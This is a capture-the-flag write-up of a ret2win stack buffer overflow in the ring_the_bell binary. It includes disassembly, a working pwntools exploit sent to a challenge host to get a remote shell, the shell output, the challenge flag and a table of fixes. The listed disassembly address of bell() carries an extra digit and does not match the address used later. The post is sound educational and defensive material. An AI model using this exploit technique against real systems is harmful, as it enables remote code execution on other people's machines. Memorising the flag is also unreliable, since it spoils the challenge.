# ring_the_bell: Writeup

**Category:** Pwn (Stack Buffer Overflow / ret2win)
**File provided:** `ring_the_bell` (ELF 64-bit, x86-64, not stripped, no PIE, no canary)

## TL;DR

`main()` reserves a 32-byte stack buffer but reads up to 96 bytes into it with
no bounds checking, no stack canary, and no PIE: a classic ret2win. The binary
ships with an unused function, `bell()`, that calls `execl("/bin/sh", "sh", NULL)`.
Overflowing the buffer to overwrite the saved return address with `bell()`'s
address hands us a shell directly on the remote connection.

```
HTB{R1ng4_R1ng4_R1111111nG_ae2a4adf4c9e7494d5e890be1b63f4b7}
```

---

## 1. Recon

```
$ file ring_the_bell
ring_the_bell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

Key facts from `readelf`:
- **Type: EXEC** (not `DYN`) → **no PIE**, addresses are fixed at compile time.
- No `__stack_chk_fail` calls in `main` → **no stack canary**.

Since the binary is not stripped, symbol names are intact, making static
analysis straightforward.

## 2. Finding the bug

Disassembling `main()`:

```asm
sub    rsp, 0x20                  ; 32-byte local buffer
lea    rax, [rbp-0x20]            ; buf = rbp-0x20
mov    edx, 0x60                  ; size = 0x60 (96)
mov    rsi, rax                   ; buf
mov    edi, 0x0                   ; fd = 0 (stdin)
call   read
```

`main` allocates a 32-byte buffer (`rbp-0x20` through `rbp`) but calls
`read(0, buf, 0x60)`: up to 96 bytes can be written into a 32-byte space.
That's a 64-byte overflow, more than enough to reach the saved base pointer
and the return address.

### Stack layout

```
 rbp-0x20 ┌───────────────────────────────┐
          │      32-byte input buffer      │
 rbp-0x00 ├───────────────────────────────┤
          │         saved RBP (8 B)        │
 rbp+0x08 ├───────────────────────────────┤
          │      return address (8 B)      │
          └───────────────────────────────┘
```

Offset from the start of the buffer to the return address:
`0x20 (buffer) + 0x8 (saved RBP) = 40 bytes`.

## 3. Finding the win function

The binary has a function that's never called from `main()` under normal
control flow:

```asm
0000000000401776d <bell>:
  endbr64
  push   rbp
  mov    rbp, rsp
  mov    edx, 0x0                 ; argv[2] = NULL
  lea    rax, [rip+...]           ; "sh"      -> argv[1]
  mov    rsi, rax
  lea    rax, [rip+...]           ; "/bin/sh" -> argv[0] / path
  mov    rdi, rax
  call   execl@plt
```

`bell()` is a self-contained `execl("/bin/sh", "sh", NULL)`: exactly what
we need to pop a shell, and it's sitting at a fixed address (`0x40176d`)
since the binary has no PIE.

## 4. Building the exploit

Payload layout:

```
[ 40 bytes padding ][ 8-byte address of bell() ]
```

```python
from pwn import *

HOST = "154.57.164.66"
PORT = 31715

p = remote(HOST, PORT)

BELL_ADDR = 0x40176d
payload = b'A' * 40 + p64(BELL_ADDR)

p.send(payload)
p.sendline(b'cat flag.txt')
p.interactive()
```

### What happens on the target

1. `read()` copies our 48-byte payload into the 32-byte buffer, overflowing
   into the saved RBP (junk `A`s, unused) and the return address.
2. `main()` finishes and executes `leave; ret`. Instead of returning to
   `__libc_start_main`, it jumps to our injected address: `bell()`.
3. `bell()` runs `execl("/bin/sh", "sh", NULL)`, replacing the process image
   with a shell: still attached to the same socket.
4. We send shell commands over the now-interactive connection.

## 5. Getting the flag

```
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
HTB{R1ng4_R1ng4_R1111111nG_ae2a4adf4c9e7494d5e890be1b63f4b7}
```

## Root cause summary

| | |
|---|---|
| **Intended/actual bug** | `read(0, buf, 0x60)` into a 32-byte stack buffer: classic unchecked-length overflow. |
| **Contributing factors** | No stack canary (overflow into the return address goes undetected), no PIE (fixed, predictable addresses). |
| **Exploit primitive** | Overwrite saved return address with the address of `bell()`, a leftover/unused `execl("/bin/sh", ...)` function baked into the binary. |
| **Impact** | Full remote code execution via return-oriented control-flow hijack to a single existing function (no ROP chain or shellcode needed). |
| **Fix** | Bound the `read()` call to the actual buffer size (e.g. `read(0, buf, sizeof(buf))`), compile with stack canaries (`-fstack-protector-all`) and PIE, and remove/guard any function that spawns a shell. |
